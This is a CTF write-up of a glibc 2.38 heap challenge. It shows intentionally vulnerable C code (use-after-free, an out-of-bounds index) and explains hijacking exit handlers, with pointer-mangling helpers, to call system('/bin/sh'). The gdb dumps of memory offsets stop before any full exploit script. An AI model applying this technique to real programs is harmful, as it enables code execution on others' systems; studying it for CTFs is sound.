# Solution

This solution was based off of:
```
https://ctftime.org/writeup/34804
https://binholic.blogspot.com/2017/05/notes-on-abusing-exit-handlers.html
```

## Looking at the program

So looking at the program we see this code:

```
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include "chall-05.h"

char *chunks[10];
unsigned int chunk_sizes[10];

void main(void) {
  unsigned int menu_choice;

  while (1 == 1) {
  puts("Menu:\n1.) Allocate New Chunk\n2.) View Chunk\n3.) Edit Chunk\n4.) Free Chunk\n5.) Remove Chunk\n");
  puts("Please enter menu choice:");
  menu_choice = get_uint();

  if (menu_choice == ALLOCATE) {
    allocate_chunk();
  }

  else if (menu_choice == VIEW) {
    view_chunk();
  }

  else if (menu_choice == EDIT) {
    edit_chunk();
  }

  else if (menu_choice == FREE) {
    free_chunk();
  }

  else if (menu_choice == REMOVE) {
    remove_chunk();
  }   

  else if (menu_choice == SECRET) {
    secret();
  }   

  else {
    printf("Unknown Menu Choice: %d\n", menu_choice);
  }
  }
}

void you_win(void) {
  puts("Call this function to win!");

  puts("\n\nYou Win\n\n");
}

unsigned int get_uint(void) {
  char buf[20];

  fgets(buf, sizeof(buf) - 1, stdin);
  puts("");
  return (unsigned int)atoi(buf);
}

unsigned int get_chunk_idx(void) {
  unsigned chunk_idx;
  char *chunk;

  puts("Which chunk idx would you like?");
  chunk_idx = get_uint();


  if ((chunk_idx <= MAX_CHUNK_IDX)) {
  printf("You choose idx: %u\n\n", chunk_idx);
  }

  else {
  puts("Bad Chunk IDX\n");
  return -1;
  }

  chunk = chunks[chunk_idx];

  if (chunk == NULL) {
  puts("Chunk doesn't exist.\n");
  return -1;
  }

  else {
  return chunk_idx;
  }

}

void allocate_chunk(void) {
  unsigned int new_chunk_size, chunk_idx;
  char *new_chunk;

  puts("Allocating a new chunk!\n");

  printf("Enter the chunk size between 0x%x-0x%x:\n",
  MIN_CHUNK_SIZE, MAX_CHUNK_SIZE);

  new_chunk_size = get_uint();

  if ((new_chunk_size > MIN_CHUNK_SIZE) && (new_chunk_size < MAX_CHUNK_SIZE)) {
  printf("Chunk Size: 0x%x\n\n", new_chunk_size);
  }

  else {
  puts("You have inputed a bad chunks size.\n");
  return;
  }

  puts("Which chunk spot would you like to allocate?");
  chunk_idx = get_uint();

  if ((chunk_idx < MAX_CHUNK_IDX)) {
  printf("Choosen chunk idx: 0x%x\n\n", chunk_idx);
  }

  else {
  puts("Bad Chunk IDX\n");
  return;
  }

  if (chunks[chunk_idx] != NULL) {
  puts("Chunk already exists there!\n");
  return;
  }

  new_chunk = malloc(new_chunk_size);
  chunks[chunk_idx] = new_chunk;
  chunk_sizes[chunk_idx] = new_chunk_size;

  puts("Chunk has been allocated!\n");

}

void view_chunk(void) {
  unsigned int chunk_idx;
  char *chunk;

  puts("Viewing a chunk!\n");

  chunk_idx = get_chunk_idx();
  if (chunk_idx == -1) {
  puts("Your chunk idx is invalid.\n");
  return;
  }

  chunk = chunks[chunk_idx];

  printf("Chunk Contents: %s\x0d\x0a\n", chunk);
}

void edit_chunk(void) {
  unsigned int chunk_idx, chunk_size;
  char *chunk;

  puts("Editing a chunk!\n");

  chunk_idx = get_chunk_idx();
  if (chunk_idx == -1) {
  puts("Your chunk idx is invalid.\n");
  return;
  }

  chunk = chunks[chunk_idx];
  chunk_size = chunk_sizes[chunk_idx];

  puts("Please input new chunk content:\n");

  read(0, chunk, chunk_size);

  puts("\nChunk has been edited!\n");
}

void free_chunk(void) {
  unsigned int chunk_idx;
  char *chunk;

  puts("Freeing a chunk!\n");

  chunk_idx = get_chunk_idx();
  if (chunk_idx == -1) {
  puts("Your chunk idx is invalid.\n");
  return;
  }

  chunk = chunks[chunk_idx];
  free(chunk);

  puts("Chunk has been freed!\n");
}

void remove_chunk(void) {
  unsigned int chunk_idx;

  puts("Removing a chunk!\n");

  chunk_idx = get_chunk_idx();
  if (chunk_idx == -1) {
  puts("Your chunk idx is invalid.\n");
  return;
  }

  chunks[chunk_idx] = NULL;
  chunk_sizes[chunk_idx] = 0x00;

  puts("Chunk has been removed!\n");
}

void secret(void) {
  exit(0);
}
```

With this header file:

```
#define ALLCOATE 0x00
#define ALLOCATE 0x01
#define VIEW 0x02
#define EDIT 0x03
#define FREE 0x04
#define REMOVE 0x05
#define SECRET 0x06

#define MAX_CHUNK_IDX 30
#define MAX_CHUNK_SIZE 0x1000
#define MIN_CHUNK_SIZE 0x00

void allocate_chunk();
void view_chunk();
void edit_chunk();
void free_chunk();
void remove_chunk();
void secret();

unsigned int get_uint();
void you_win();
```

This is pretty similar to `chal 00` (same bug). There are three main differences. The `fgets` call got replaced with `read`. The max number of chunks increased to `30`. And the biggest change is `secret` no longer gives us infoleaks, instead it calls `exit`.


## How will we pwn this?

So, while this seems pretty similar to `chal 00`, there is one key difference. We don't really have a way to get PIE/Stack infoleaks. While we still have the same ability to get an arbitrary write via the tcache primitive, we can't read/write to either the stack or PIE regions, since we don't know the address space.

We can, however, leak addresses for both the Heap, and Libc. We can do this easily, just move two chunks over to the large bin, and read the first ptr of each (one will be a libc, the other will be a heap address).

In previous CTF challenges, the typical goto strategy is to write over the free/malloc hooks. A hook is effectively an instruction address that gets executed when something happens. The `free/malloc` hooks were instruction addresses that we could write to, and they would get called whenever malloc/free were called. Thus by overwriting them with a value we want, and then calling `free/malloc`, we could execute whatever instruction address we wanted to.

However in glibc 2.34, those hooks got removed, so it is no longer possible to do that. However, we have the ability to call `exit`, and `exit` has a somewhat similar functionality. We will be leveraging this in order to get code execution. However this process will be a bit more complicated.

Looking at the `exit` code in `stdlib/exit.c`, we see this:

```
void
exit (int status)
{
  __run_exit_handlers (status, &__exit_funcs, true, true);
}
libc_hidden_def (exit)
```

It effectively calls `__run_exit_handlers`, which we see does this (also from `stdlib/exit.c`):

```
/* Initialize the flag that indicates exit function processing
   is complete. See concurrency notes in stdlib/exit.h where
   __exit_funcs_lock is declared.  */
bool __exit_funcs_done = false;

/* Call all functions registered with `atexit' and `on_exit',
   in the reverse of the order in which they were registered
   perform stdio cleanup, and terminate program execution with STATUS.  */
void
attribute_hidden
__run_exit_handlers (int status, struct exit_function_list **listp,
          bool run_list_atexit, bool run_dtors)
{
  /* First, call the TLS destructors.  */
#ifndef SHARED
  if (&__call_tls_dtors != NULL)
#endif
  if (run_dtors)
    __call_tls_dtors ();

  __libc_lock_lock (__exit_funcs_lock);

  /* We do it this way to handle recursive calls to exit () made by
  the functions registered with `atexit' and `on_exit'. We call
  everyone on the list and use the status value in the last
  exit (). */
  while (true)
  {
    struct exit_function_list *cur;

  restart:
    cur = *listp;

    if (cur == NULL)
  {
    /* Exit processing complete.  We will not allow any more
      atexit/on_exit registrations.  */
    __exit_funcs_done = true;
    break;
  }

    while (cur->idx > 0)
  {
    struct exit_function *const f = &cur->fns[--cur->idx];
    const uint64_t new_exitfn_called = __new_exitfn_called;

    switch (f->flavor)
      {
        void (*atfct) (void);
        void (*onfct) (int status, void *arg);
        void (*cxafct) (void *arg, int status);
        void *arg;

      case ef_free:
      case ef_us:
        break;
      case ef_on:
        onfct = f->func.on.fn;
        arg = f->func.on.arg;
        PTR_DEMANGLE (onfct);

        /* Unlock the list while we call a foreign function.  */
        __libc_lock_unlock (__exit_funcs_lock);
        onfct (status, arg);
        __libc_lock_lock (__exit_funcs_lock);
        break;
      case ef_at:
        atfct = f->func.at;
        PTR_DEMANGLE (atfct);

        /* Unlock the list while we call a foreign function.  */
        __libc_lock_unlock (__exit_funcs_lock);
        atfct ();
        __libc_lock_lock (__exit_funcs_lock);
        break;
      case ef_cxa:
        /* To avoid dlclose/exit race calling cxafct twice (BZ 22180),
      we must mark this function as ef_free.  */
        f->flavor = ef_free;
        cxafct = f->func.cxa.fn;
        arg = f->func.cxa.arg;
        PTR_DEMANGLE (cxafct);

        /* Unlock the list while we call a foreign function.  */
        __libc_lock_unlock (__exit_funcs_lock);
        cxafct (arg, status);
        __libc_lock_lock (__exit_funcs_lock);
        break;
      }

    if (__glibc_unlikely (new_exitfn_called != __new_exitfn_called))
      /* The last exit function, or another thread, has registered
        more exit functions.  Start the loop over.  */
      goto restart;
  }

    *listp = cur->next;
    if (*listp != NULL)
  /* Don't free the last element in the chain, this is the statically
    allocate element.  */
  free (cur);
  }

  __libc_lock_unlock (__exit_funcs_lock);

  if (run_list_atexit)
  call_function_static_weak (_IO_cleanup);

  _exit (status);
}
```

So there's a bit here, let's break it down.

There are two while loops, nested in each other. These loops will effectively iterate through a list of exit functions to call.

Looking at the code for `exit`, we see that the linked list is stored in the libc global `__exit_funcs`.

Which in `stdlib/cxa_atexit.c`, we see it's type is `exit_function_list`:

```
struct exit_function_list *__exit_funcs = &initial;
```

Which we see, has this structure:

```
enum
{
  ef_free,  /* `ef_free' MUST be zero!  */
  ef_us,
  ef_on,
  ef_at,
  ef_cxa
};

struct exit_function
  {
  /* `flavour' should be of type of the `enum' above but since we need
    this element in an atomic operation we have to use `long int'.  */
  long int flavor;
  union
    {
  void (*at) (void);
  struct
    {
      void (*fn) (int status, void *arg);
      void *arg;
    } on;
  struct
    {
      void (*fn) (void *arg, int status);
      void *arg;
      void *dso_handle;
    } cxa;
    } func;
  };
struct exit_function_list
  {
  struct exit_function_list *next;
  size_t idx;
  struct exit_function fns[32];
  };
```


So what do we see here? The `exit_function_list` is a node in a singly linked list, which is made apparent by the `struct exit_function_list *next;` field. There is also an `idx` value, to record how many entries in the `exit_funcion fns[32]` array it has (will be discussed in a second). Also, note the `exit_function fns[32]` array.

We see the structure for an `exit_function`, first containing the `long int flavor;` value. Then there is a Union between structs. The purpose of a union in this context is when you want to be able to store different data types in a field. It will effectively just take the largest data type, and allocate space for that, since the rest of the dataypes should be either that size or smaller.

Looking at the union, it's a union between two `structs`, `on` and `cxa`. The data stored at this union, is what is actually the function ptr and arguments which get called.

Also, the `enums` are the different flavors, which are effectively the different type of functions you can have (mainly affects the arguments you can pass to it).

So, in summary. You have a linked list where each node is a `exit_function_list`. Each `exit_function_list` will contain an array of functions, which will be called. There are different "flavors" (types) of functions you can call, which mainly just affects the arguments you can use.

Looking back at `exit.c`, and looking at the different types of flavors, we see this for the `cxa` flavor:

```
      case ef_cxa:
        /* To avoid dlclose/exit race calling cxafct twice (BZ 22180),
      we must mark this function as ef_free.  */
        f->flavor = ef_free;
        cxafct = f->func.cxa.fn;
        arg = f->func.cxa.arg;
        PTR_DEMANGLE (cxafct);

        /* Unlock the list while we call a foreign function.  */
        __libc_lock_unlock (__exit_funcs_lock);
        cxafct (arg, status);
        __libc_lock_lock (__exit_funcs_lock);
        break;
      }
```

So here, we can see that we can call a function, with an argument we specify, which is beneficial. Since we know the address space of libc, we can call the `system` function with `/bin/sh` as an argument (both exist in the libc address space, and we know their addresses). Or we can call a libc onegadget (I'm unsure if I will use it here, look it up, it's super helpful, effectively if the conditions are right it's a single libc instruction you can call to get a shell).

So, we will need to create a `exit_function_list` with a single `exit_function fns[32]` which will be to the instruction ptr we want to execute, which will be of the `cxa` flavor.

There is one more thing we will need to cover, before we put it all together. Do you see that `PTR_DEMANGLE` call? Here is the code for that macro in the `sysdeps/unix/sys/linux/x86_64/pointer_guard.h` file:

```
# ifdef __ASSEMBLER__
#  define PTR_MANGLE(reg)     xor __pointer_chk_guard_local(%rip), reg; \
                              rol $2*LP_SIZE+1, reg
#  define PTR_DEMANGLE(reg)   ror $2*LP_SIZE+1, reg;                    \
                              xor __pointer_chk_guard_local(%rip), reg
# else
#  define PTR_MANGLE(reg)     asm ("xor __pointer_chk_guard_local(%%rip), %0\n" \
                                  "rol $2*" LP_SIZE "+1, %0"                \
                                  : "=r" (reg) : "0" (reg))
#  define PTR_DEMANGLE(reg)   asm ("ror $2*" LP_SIZE "+1, %0\n"               \
                                  "xor __pointer_chk_guard_local(%%rip), %0"   \
                                  : "=r" (reg) : "0" (reg))
# endif
#else
# ifdef __ASSEMBLER__
#  define PTR_MANGLE(reg)     xor %fs:POINTER_GUARD, reg;                 \
                              rol $2*LP_SIZE+1, reg
#  define PTR_DEMANGLE(reg)   ror $2*LP_SIZE+1, reg;                      \
                              xor %fs:POINTER_GUARD, reg
# else
#  define PTR_MANGLE(var)     asm ("xor %%fs:%c2, %0\n"                   \
                                  "rol $2*" LP_SIZE "+1, %0"            \
                                  : "=r" (var)                          \
                                  : "0" (var),                          \
                                    "i" (POINTER_GUARD))
#  define PTR_DEMANGLE(var)   asm ("ror $2*" LP_SIZE "+1, %0\n"           \
                                  "xor %%fs:%c2, %0"                    \
                                  : "=r" (var)                          \
                                  : "0" (var),                          \
                                    "i" (POINTER_GUARD))
# endif
#endif
```

So it looks like we are dealing with inlined assembly code here, and it can be a bit hard to actually tell what's happening.

Basically, this is what's happening. You remember tcache ptr mangling with the next ptr? Something sort of similar to that is happening here. Libc will mangle instruction ptrs, to help make it harder to do what we are trying to do.

The exact macro `PTR_MANGLE`, takes in an argument. It will first `xor` the `reg` value by `__pointer_chk_guard_local` (`"xor __pointer_chk_guard_local(%%rip), %0\n"`). Then it will shift it to the left by `0x11` bits (`"rol $2*" LP_SIZE "+1, %0"`). How did we know it is `0x11` bits? We can look at what `LP_SIZE` is defined as in `sysdeps/x86_64/x86-lp_size.h`:

```
#ifdef __ASSEMBLER__
# define LP_SIZE 8
#else
# define LP_SIZE "8"
#endif
```

So we see that `LP_SIZE` is `8`. Since it is `(2 * LP_SIZE) + 1`, `(2 * 0x8) + 1 = 0x11`. Also, since it is the `rol` instruction, the left most bit will get shifted back over the lowest bit. For instance:

```
0x8000000000000000
0b1000000000000000000000000000000000000000000000000000000000000000

shifted over to the left by `1`, becomes

0x0000000000000001
0b0000000000000000000000000000000000000000000000000000000000000001
```

For ptr demangling, it effectively does the opposite of ptr mangling as we see. It will rotate the value to demangle to the right by `0x11` bits, then xor it by the `__pointer_chk_guard_local` value. So effectively ptr mangling will xor the value to mangle, and `xor` it by `__pointer_chk_guard_local` (which will act us a key).

Here are some python3 functions, which basically do the same thing:

```
def shift_right_carry(number: int, shift_amount: int) -> int:
  for i in range(shift_amount):
  if (number & 1) == 0:
    number = number >> 1
  else:
    number = (number >> 1) | 0x8000000000000000
  return number

def shift_left_carry(number: int, shift_amount: int) -> int:
  for i in range(shift_amount):
  if ((number & 0x8000000000000000) != 0):
    number = ((number << 1) & 0xffffffffffffffff) | 0x1
  else:
    number = ((number << 1) & 0xffffffffffffffff)
  return number

def mangle_instruction_ptr(ins_ptr: int, key: int) -> int:
  mangled_ptr = ins_ptr ^ key
  mangled_ptr = shift_left_carry(mangled_ptr, 0x11)
  return mangled_ptr

def demangle_instruction_ptr(mangled_ins_ptr: int, key: int) -> int:
  demangled_ptr = shift_right_carry(mangled_ins_ptr, 0x11)
  demangled_ptr = demangled_ptr ^ key
  return demangled_ptr
```

So, let's see an example of mangling demangling instruction pointers. Here, we see that the `__pointer_chk_guard_local` (`key` value) is `0x2131edb9f9eb9b08`, and is stored in the linker (`ld`). We have a libc infoleak, but we don't have a leak to the `ld` memory region, so we won't be able to read it directly.

The mangled instruction pointer, we see, is `0x246adb806c704263`. We see it is the first `exit_function_list` stored in `__exit_funcs`, with the mangled instruction pointer being stored at an offset of `0x22e1b8` (`0x7f8c9422e1b8 - 0x00007f8c94000000 = 0x22e1b8`) from the start of the libc address space.

```
gef➤  p __pointer_chk_guard_local
$1 = 0x2131edb9f9eb9b08
gef➤  search-pattern 0x2131edb9f9eb9b08
[+] Searching '\x08\x9b\xeb\xf9\xb9\xed\x31\x21' in memory
[+] In (0x7f8c942b1000-0x7f8c942b6000), permission=rw-
  0x7f8c942b1770 - 0x7f8c942b1790  →   "\x08\x9b\xeb\xf9\xb9\xed\x31\x21[...]"
[+] In '/home/guy/glibc-2.38/compiled-2.38/lib/ld-linux-x86-64.so.2'(0x7f8c942e8000-0x7f8c942ea000), permission=r--
  0x7f8c942e9ad0 - 0x7f8c942e9af0  →   "\x08\x9b\xeb\xf9\xb9\xed\x31\x21[...]"
[+] In '[stack]'(0x7ffd966df000-0x7ffd96700000), permission=rw-
  0x7ffd966fe651 - 0x7ffd966fe671  →   "\x08\x9b\xeb\xf9\xb9\xed\x31\x21[...]"
gef➤  x/10g 0x7f8c942e9ac0
0x7f8c942e9ac0 <start_time>:  0x24baca7e81a7b 0x927e8
0x7f8c942e9ad0 <__pointer_chk_guard_local>: 0x2131edb9f9eb9b08  0x7ffd966fe378
0x7f8c942e9ae0 <_dl_argc>:  0x1 0x0
0x7f8c942e9af0: 0x0 0x0
0x7f8c942e9b00 <_rtld_local_ro>:  0x0 0x7ffd966fe659
gef➤  p __exit_funcs
$2 = (struct exit_function_list *) 0x7f8c9422e1a0 <initial>
gef➤  x/20g 0x7f8c9422e1a0
0x7f8c9422e1a0 <initial>: 0x0 0x1
0x7f8c9422e1b0 <initial+16>:  0x4 0x246adb806c704263
0x7f8c9422e1c0 <initial+32>:  0x0 0x0
0x7f8c9422e1d0 <initial+48>:  0x0 0x0
0x7f8c9422e1e0 <initial+64>:  0x0 0x0
0x7f8c9422e1f0 <initial+80>:  0x0 0x0
0x7f8c9422e200 <initial+96>:  0x0 0x0
0x7f8c9422e210 <initial+112>: 0x0 0x0
0x7f8c9422e220 <initial+128>: 0x0 0x0
0x7f8c9422e230 <initial+144>: 0x0 0x0
gef➤  vmmap
[ Legend:  Code | Heap | Stack ]
Start           End             Offset          Perm Path
0x000056274b56a000 0x000056274b56b000 0x0000000000000000 r-- /Hackery/shogun/challs/05/chall-05
0x000056274b56b000 0x000056274b56c000 0x0000000000001000 r-x /Hackery/shogun/challs/05/chall-05
0x000056274b56c000 0x000056274b56d000 0x0000000000002000 r-- /Hackery/shogun/challs/05/chall-05
0x000056274b56d000 0x000056274b56e000 0x0000000000002000 r-- /Hackery/shogun/challs/05/chall-05
0x000056274b56e000 0x000056274b56f000 0x0000000000003000 rw- /Hackery/shogun/challs/05/chall-05
0x000056274c055000 0x000056274c076000 0x0000000000000000 rw- [heap]
0x00007f8c94000000 0x00007f8c94022000 0x0000000000000000 r-- /home/guy/glibc-2.38/compiled-2.38/lib/libc.so.6
0x00007f8c94022000 0x00007f8c94172000 0x0000000000022000 r-x /home/guy/glibc-2.38/compiled-2.38/lib/libc.so.6
0x00007f8c94172000 0x00007f8c941c8000 0x0000000000172000 r-- /home/guy/glibc-2.38/compiled-2.38/lib/libc.so.6
0x00007f8c941c8000 0x00007f8c941c9000 0x00000000001c8000 --- /home/guy/glibc-2.38/compiled-2.38/lib/libc.so.6
0x00007f8c941c9000 0x00007f8c9422c000 0x00000000001c8000 r-- /home/guy/glibc-2.38/compiled-2.38/lib/libc.so.6
0x00007f8c9422c000 0x00007f8c9422e000 0x000000000022b000 rw- /home/guy/glibc-2.38/compiled-2.38/lib/libc.so.6
0x00007f8c9422e000 0x00007f8c9423b000 0x0000000000000000 rw-
0x00007f8c942b1000 0x00007f8c942b6000 0x0000000000000000 rw-
0x00007f8c942b6000 0x00007f8c942b7000 0x0000000000000000 r-- /home/guy/glibc-2.38/compiled-2.38/lib/ld-linux-x86-64.so.2
0x00007f8c942b7000 0x00007f8c942dd000 0x0000000000001000 r-x /home/guy/glibc-2.38/compiled-2.38/lib/ld-linux-x86-64.so.2
0x00007f8c942dd000 0x00007f8c942e7000 0x0000000000027000 r-- /home/guy/glibc-2.38/compiled-2.38/lib/ld-linux-x86-64.so.2
0x00007f8c942e8000 0x00007f8c942ea000 0x0000000000031000 r-- /home/guy/glibc-2.38/compiled-2.38/lib/ld-linux-x86-64.so.2
0x00007f8c942ea000 0x00007f8c942ec000 0x0000000000033000 rw- /home/guy/glibc-2.38/compiled-2.38/lib/ld-linux-x86-64.so.2
0x00007ffd966df000 0x00007ffd96700000 0x0000000000000000 rw- [stack]
0x00007ffd96702000 0x00007ffd96706000 0x0000000000000000 r-- [vvar]
0x00007ffd96706000 0x00007ffd96708000 0x0000000000000000 r-x [vdso]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 --x [vsyscall]
```

Which we can mangle/demangle like this:

```
>>> print(hex(demangle_instruction_ptr(0x246adb806c704263, 0x2131edb9f9eb9b08)))
0x7f8c942bad30
>>> print(hex(mangle_instruction_ptr(0x7f8c942bad30, 0x2131edb9f9eb9b08)))
0x246adb806c704263
```

Which we see in a different run, that the function that is stored there is `_dl_fini`. We also see that the offset to the libc `system` function is `0x7f15e5648810 - 0x00007f15e5600000 = 0x48810`. We also see that the offset to the libc string `/bin/sh` is `0x18cf2d`. We also see that the offset to `initial` is `0x22e1a0` (`0x7f15e582e1a0 - 0x00007f15e5600000`):

```
gef➤  p __exit_funcs
$1 = (struct exit_function_list *) 0x7f15e582e1a0 <initial>
gef➤  p __pointer_chk_guard_local
$2 = 0xc4ae1d0d94e44320
gef➤  x/20g 0x7f15e582e1a0
0x7f15e582e1a0 <initial>: 0x0 0x1
0x7f15e582e1b0 <initial+16>:  0x4 0xc430e2e39c21895c
0x7f15e582e1c0 <initial+32>:  0x0 0x0
0x7f15e582e1d0 <initial+48>:  0x0 0x0
0x7f15e582e1e0 <initial+64>:  0x0 0x0
0x7f15e582e1f0 <initial+80>:  0x0 0x0
0x7f15e582e200 <initial+96>:  0x0 0x0
0x7f15e582e210 <initial+112>: 0x0 0x0
0x7f15e582e220 <initial+128>: 0x0 0x0
0x7f15e582e230 <initial+144>: 0x0 0x0
gef➤  x/10g 0x7f15e5958d30
0x7f15e5958d30 <_dl_fini>:  0xe5894855fa1e0ff3  0x5441554156415741
0x7f15e5958d40 <_dl_fini+16>: 0x258b4c28ec834853  0x1ec83490002fcd4
0x7f15e5958d50 <_dl_fini+32>: 0x3145000001e1880f  0x2fcc82d8d4cf6
0x7f15e5958d60 <_dl_fini+48>: 0xb5058d48a41c8d4b  0x4805e3c1480002f2
0x7f15e5958d70 <_dl_fini+64>: 0x401f0f22ebc301  0x2ed0f15ffef894c
gef➤  vmmap
[ Legend:  Code | Heap | Stack ]
Start           End             Offset          Perm Path
0x00005591e8830000 0x00005591e8831000 0x0000000000000000 r-- /Hackery/shogun/challs/05/chall-05
0x00005591e8831000 0x00005591e8832000 0x0000000000001000 r-x /Hackery/shogun/challs/05/chall-05
0x00005591e8832000 0x00005591e8833000 0x0000000000002000 r-- /Hackery/shogun/challs/05/chall-05
0x00005591e8833000 0x00005591e8834000 0x0000000000002000 r-- /Hackery/shogun/challs/05/chall-05
0x00005591e8834000 0x00005591e8835000 0x0000000000003000 rw- /Hackery/shogun/challs/05/chall-05
0x00005591e8ab4000 0x00005591e8ad5000 0x0000000000000000 rw- [heap]
0x00007f15e5600000 0x00007f15e5622000 0x0000000000000000 r-- /home/guy/glibc-2.38/compiled-2.38/lib/libc.so.6
0x00007f15e5622000 0x00007f15e5772000 0x0000000000022000 r-x /home/guy/glibc-2.38/compiled-2.38/lib/libc.so.6
0x00007f15e5772000 0x00007f15e57c8000 0x0000000000172000 r-- /home/guy/glibc-2.38/compiled-2.38/lib/libc.so.6
0x00007f15e57c8000 0x00007f15e57c9000 0x00000000001c8000 --- /home/guy/glibc-2.38/compiled-2.38/lib/libc.so.6
0x00007f15e57c9000 0x00007f15e582c000 0x00000000001c8000 r-- /home/guy/glibc-2.38/compiled-2.38/lib/libc.so.6
0x00007f15e582c000 0x00007f15e582e000 0x000000000022b000 rw- /home/guy/glibc-2.38/compiled-2.38/lib/libc.so.6
0x00007f15e582e000 0x00007f15e583b000 0x0000000000000000 rw-
0x00007f15e594f000 0x00007f15e5954000 0x0000000000000000 rw-
0x00007f15e5954000 0x00007f15e5955000 0x0000000000000000 r-- /home/guy/glibc-2.38/compiled-2.38/lib/ld-linux-x86-64.so.2
0x00007f15e5955000 0x00007f15e597b000 0x0000000000001000 r-x /home/guy/glibc-2.38/compiled-2.38/lib/ld-linux-x86-64.so.2
0x00007f15e597b000 0x00007f15e5985000 0x0000000000027000 r-- /home/guy/glibc-2.38/compiled-2.38/lib/ld-linux-x86-64.so.2
0x00007f15e5986000 0x00007f15e5988000 0x0000000000031000 r-- /home/guy/glibc-2.38/compiled-2.38/lib/ld-linux-x86-64.so.2
0x00007f15e5988000 0x00007f15e598a000 0x0000000000033000 rw- /home/guy/glibc-2.38/compiled-2.38/lib/ld-linux-x86-64.so.2
0x00007ffe3a264000 0x00007ffe3a285000 0x0000000000000000 rw- [stack]
0x00007ffe3a39d000 0x00007ffe3a3a1000 0x0000000000000000 r-- [vvar]
0x00007ffe3a3a1000 0x00007ffe3a3a3000 0x0000000000000000 r-x [vdso]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 --x [vsyscall]
gef➤  p system
$3 = {int (const char *)} 0x7f15e5648810 <__libc_system>
gef➤  search-pattern /bin/sh
[+] Searching '/bin/sh' in memory
[+] In '/home/guy/glibc-2.38/compiled-2.38/lib/libc.so.6'(0x7f15e5772000-0x7f15e57c8000), permission=r--
  0x7f15e578cf2d - 0x7f15e578cf34  →   "/bin/sh"
```

Python3 demangling:

```
>>> print(hex(demangle_instruction_ptr(0xc430e2e39c21895c, 0xc4ae1d0d94e44320)))
0x7f15e5958d30
```

There is another piece of the puzzle we will need. We will need to know the address of `_dl_fini`. The issue is, `_dl_fini` is a function present in the linker (`ld.so`), not libc, as we see here:

```
gef➤  p _dl_fini
$1 = {void (void)} 0x7f13fd253d30 <_dl_fini>
gef➤  vmmap 0x7f13fd253d30
[ Legend:  Code | Heap | Stack ]
Start           End             Offset          Perm Path
0x00007f13fd250000 0x00007f13fd276000 0x0000000000001000 r-x /home/guy/glibc-2.38/compiled-2.38/lib/ld-linux-x86-64.so.2
```

So, we will need a `ld.so` infoleak, to know the address of the `_dl_fini` function (offset of `0x7f13fd253d30 - 0x00007f13fd250000 = 0x3d30`).

The good news is, we can find `ld.so` addresses within libc. Although it will be a little difficult. The way we can read values is via allocating a tcache chunk. As part of the tcache chunk allocation process, it will clear out the tcache key. So the memory region will need to be both readable and writable (`rw`). Looking at the memory mappings, we see that the region starting at `0x00007f13fd22c000` meets that criteria.

```
gef➤  vmmap
[ Legend:  Code | Heap | Stack ]
Start           End             Offset          Perm Path
0x000056253b27d000 0x000056253b27e000 0x0000000000000000 r-- /Hackery/shogun/challs/05/chall-05
0x000056253b27e000 0x000056253b27f000 0x0000000000001000 r-x /Hackery/shogun/challs/05/chall-05
0x000056253b27f000 0x000056253b280000 0x0000000000002000 r-- /Hackery/shogun/challs/05/chall-05
0x000056253b280000 0x000056253b281000 0x0000000000002000 r-- /Hackery/shogun/challs/05/chall-05
0x000056253b281000 0x000056253b282000 0x0000000000003000 rw- /Hackery/shogun/challs/05/chall-05
0x000056253bbcf000 0x000056253bbf0000 0x0000000000000000 rw- [heap]
0x00007f13fd000000 0x00007f13fd022000 0x0000000000000000 r-- /home/guy/glibc-2.38/compiled-2.38/lib/libc.so.6
0x00007f13fd022000 0x00007f13fd172000 0x0000000000022000 r-x /home/guy/glibc-2.38/compiled-2.38/lib/libc.so.6
0x00007f13fd172000 0x00007f13fd1c8000 0x0000000000172000 r-- /home/guy/glibc-2.38/compiled-2.38/lib/libc.so.6
0x00007f13fd1c8000 0x00007f13fd1c9000 0x00000000001c8000 --- /home/guy/glibc-2.38/compiled-2.38/lib/libc.so.6
0x00007f13fd1c9000 0x00007f13fd22c000 0x00000000001c8000 r-- /home/guy/glibc-2.38/compiled-2.38/lib/libc.so.6
0x00007f13fd22c000 0x00007f13fd22e000 0x000000000022b000 rw- /home/guy/glibc-2.38/compiled-2.38/lib/libc.so.6
0x00007f13fd22e000 0x00007f13fd23b000 0x0000000000000000 rw-
0x00007f13fd24a000 0x00007f13fd24f000 0x0000000000000000 rw-
0x00007f13fd24f000 0x00007f13fd250000 0x0000000000000000 r-- /home/guy/glibc-2.38/compiled-2.38/lib/ld-linux-x86-64.so.2
0x00007f13fd250000 0x00007f13fd276000 0x0000000000001000 r-x /home/guy/glibc-2.38/compiled-2.38/lib/ld-linux-x86-64.so.2
0x00007f13fd276000 0x00007f13fd280000 0x0000000000027000 r-- /home/guy/glibc-2.38/compiled-2.38/lib/ld-linux-x86-64.so.2
0x00007f13fd281000 0x00007f13fd283000 0x0000000000031000 r-- /home/guy/glibc-2.38/compiled-2.38/lib/ld-linux-x86-64.so.2
0x00007f13fd283000 0x00007f13fd285000 0x0000000000033000 rw- /home/guy/glibc-2.38/compiled-2.38/lib/ld-linux-x86-64.so.2
0x00007fff0120a000 0x00007fff0122b000 0x0000000000000000 rw- [stack]
0x00007fff01376000 0x00007fff0137a000 0x0000000000000000 r-- [vvar]
0x00007fff0137a000 0x00007fff0137c000 0x0000000000000000 r-x [vdso]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 --x [vsyscall]
0x7f13fd22c1f0: 0x0 0x0
gef➤  x/1000g 0x00007f13fd22c000
0x7f13fd22c000: 0x22bba0  0x7f13fd24d000
0x7f13fd22c010: 0x7f13fd261780  0x7f13fd14f0e0
0x7f13fd22c020 <realloc@got.plt>: 0x7f13fd022020  0x7f13fd14d680
0x7f13fd22c030 <*ABS*@got.plt>: 0x7f13fd14a710  0x7f13fd09d210
0x7f13fd22c040 <calloc@got.plt>:  0x7f13fd022060  0x7f13fd14f8c0
0x7f13fd22c050 <*ABS*@got.plt>: 0x7f13fd16c650  0x7f13fd149dc0
0x7f13fd22c060 <*ABS*@got.plt>: 0x7f13fd14a730  0x7f13fd152100
0x7f13fd22c070 <*ABS*@got.plt>: 0x7f13fd14b470  0x7f13fd1523c0
0x7f13fd22c080 <_dl_find_dso_for_object@got.plt>: 0x7f13fd0220e0  0x7f13fd14ec40
0x7f13fd22c090 <*ABS*@got.plt>: 0x7f13fd14d500  0x7f13fd14fd90
0x7f13fd22c0a0 <*ABS*@got.plt>: 0x7f13fd14bc10  0x7f13fd14d2b0
